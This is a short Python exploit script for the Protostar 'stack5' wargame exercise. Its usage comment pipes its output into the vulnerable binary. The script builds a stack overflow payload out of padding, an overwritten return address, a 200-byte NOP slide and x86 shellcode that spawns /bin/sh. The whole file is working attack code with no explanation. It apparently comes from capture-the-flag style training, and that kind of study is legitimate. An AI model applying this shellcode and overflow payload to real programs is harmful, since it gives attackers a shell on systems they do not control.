########################################
# Usage: 
# (python stack5.py ; cat) | /opt/protostar/bin/stack5
########################################

import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'
eip = struct.pack("I", 0xbffff7a0+100)
slide = '\x90'*200
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = padding + eip + slide + shellcode
print(payload)
